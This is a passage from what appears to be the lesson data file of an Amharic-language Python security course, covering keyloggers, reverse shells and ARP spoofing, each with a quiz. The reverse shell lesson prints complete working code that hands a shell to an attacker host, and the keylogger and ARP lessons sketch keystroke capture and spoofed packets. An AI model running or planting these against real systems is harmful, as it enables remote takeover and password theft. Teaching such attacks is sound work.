Keylogger ማለት ተጠቃሚው ኪቦርድ ላይ የሚነካውን ሁሉ የሚመዘግብ ማልዌር ነው። ለዚህ \`pynput\` የተባለ Library እንጠቀማለን። (በዚህ Sandbox ውስጥ ውጤቱን ብቻ ነው የምናየው)።

### The Logic
1.  **Listener:** ኪቦርዱን የሚያዳምጥ ኮድ።
2.  **Callback Function:** ቁልፍ ሲነካ ምን ይደረግ? (ወደ ፋይል ጻፍ ወይም ወደ ሃከሩ ላክ)።

\`\`\`python
# Concept Code (Requires local setup)
# from pynput.keyboard import Listener

def on_press(key):
    # ቁልፉን ወደ Log file መጻፍ
    with open("log.txt", "a") as f:
        f.write(str(key))

# with Listener(on_press=on_press) as listener:
#    listener.join()
\`\`\`
`,
    `# Simulated Keylog\nkeys = ['u', 's', 'e', 'r']\nlog = "".join(keys)\nprint(f"Logged: {log}")`,
    [{id:"q1", question:"Keylogger ዋና አላማው ምንድነው?", options:[{id:"a",text:"ፋይል ማጥፋት"},{id:"b",text:"የሚጻፈውን መረጃ መስረቅ (Password, Chat)"},{id:"c",text:"Screen መቅዳት"}], correctOptionId:"b", explanation:"Keylogger የቁልፍ ሰሌዳ ምቶች (Keystrokes) ይመዘግባል።"}]
  ),

  createLesson(
    "a-04", "07. Exploitation", "7.2 Reverse Shells", "Advanced", "Remote Control.",
    `# Reverse Shells

ሃከሮች ሲስተሙን ከሰበሩ በኋላ (Exploit ካደረጉ በኋላ)፣ የኮምፒውተሩን Terminal/CMD ማግኘት ይፈልጋሉ።
ሁለት አይነት ግንኙነት አለ፡
1.  **Bind Shell:** ሃከሩ ወደ ተጠቂው ይደውላል። (Firewall ሊዘጋው ይችላል)።
2.  **Reverse Shell:** ተጠቂው ወደ ሃከሩ ይደውላል። (Firewall ብዙ ጊዜ የወጪ ጥሪን ስለሚፈቅድ ይህ ይመረጣል)።

### Python Reverse Shell (Client Side)
ይህ ኮድ በተጠቂው ኮምፒውተር ላይ ቢሮጥ፣ CMD/Bashን ለሃከሩ ይሰጣል።

\`\`\`python
import socket
import subprocess
import os

hacker_ip = "10.0.0.1"
port = 4444

s = socket.socket()
s.connect((hacker_ip, port))

# Redirect streams to socket (Stdin, Stdout, Stderr)
os.dup2(s.fileno(), 0) 
os.dup2(s.fileno(), 1) 
os.dup2(s.fileno(), 2) 

p = subprocess.call(["/bin/sh", "-i"])
\`\`\`
`,
    `print("[*] Connecting back to C2...")\nprint("[+] Shell Spawned!")`,
    [{id:"q1", question:"Reverse Shell ከ Bind Shell በምን ይሻላል?", options:[{id:"a",text:"ይፈጥናል"},{id:"b",text:"Firewallን ለማለፍ ይመረጣል"},{id:"c",text:"Code ለመጻፍ ይቀላል"}], correctOptionId:"b", explanation:"አብዛኛው Firewall ወደ ውስጥ የሚገባን ይዘጋል እንጂ የሚወጣን አይዘጋም።"}]
  ),
  
  createLesson(
    "a-05", "07. Exploitation", "7.3 ARP Spoofing", "Advanced", "Man in the Middle.",
    `# ARP Spoofing (Man in the Middle)

በ Local Network (WiFi) ውስጥ፣ ኮምፒውተሮች እርስ በርስ የሚተዋወቁት በ **MAC Address** ነው። IP Addressን ወደ MAC Address የሚቀይረው ፕሮቶኮል **ARP (Address Resolution Protocol)** ይባላል።

ARP Spoofing ማለት፡
1.  ለ Routeru: "እኔ እኮ Victim ነኝ" ብሎ መዋሸት።
2.  ለ Victim-u: "እኔ እኮ Router ነኝ" ብሎ መዋሸት።

ይህ ሲሳካ፣ የ Victim-u ሙሉ የኢንተርኔት ትራፊክ (Passowrds, Images) በእኛ ኮምፒውተር በኩል ያልፋል።

### Scapy Library
Python ላይ \`Scapy\` የተባለ Library በመጠቀም የውሸት ARP Packet መላክ ይቻላል።

\`\`\`python
# Concept
# packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip)
# send(packet)
\`\`\`
`,
    `print("Spoofing 192.168.1.5...")\nprint("Redirecting traffic...")`,
    [{id:"q1", question:"ARP Spoofing ምን አይነት ጥቃት ነው?", options:[{id:"a",text:"DoS"},{id:"b",text:"Man in the Middle (MitM)"},{id:"c",text:"Phishing"}], correctOptionId:"b", explanation:"ሃከሩ በመሃል ገብቶ መረጃ ይሰርቃል።"}]
  )
];

const CPP_LESSONS: Lesson[] = [
    { id: "cpp-1", category: "Memory", title: "1.1 Pointers", description: "Direct memory access", level: "Advanced", content: "# Pointers\nDirect memory manipulation.", starterCode: "int* p;", quiz: [] }
];

export const getCourseData = (language: Language, isBeginner: boolean = true): SyllabusItem[] => {
  const lessons = language === 'python' 
    ? (isBeginner ? PYTHON_BEGINNER_LESSONS : PYTHON_ADVANCED_LESSONS)
    : CPP_LESSONS;

  return lessons.map(l => ({
    id: l.id,
    title: l.title,
    description: l.description,
    category: l.category,
    level: l.level
  }));
};

export const getLessonById = (id: string): { title: string, content: string, starterCode: string, quiz?: QuizQuestion[], isProject?: boolean } => {
  const allLessons = [...PYTHON_BEGINNER_LESSONS, ...PYTHON_ADVANCED_LESSONS, ...CPP_LESSONS];
  const lesson = allLessons.find(l => l.id === id);

  if (lesson) {
    return {
      title: lesson.title,
      content: lesson.content,
      starterCode: lesson.starterCode,
      quiz: lesson.quiz,
      isProject: lesson.isProject
    };
  }

  return {
    title: "Module Loading Error",
    content: "# 404 Not Found\nThe requested module could not be loaded.",
    starterCode: "# Error"
  };
};
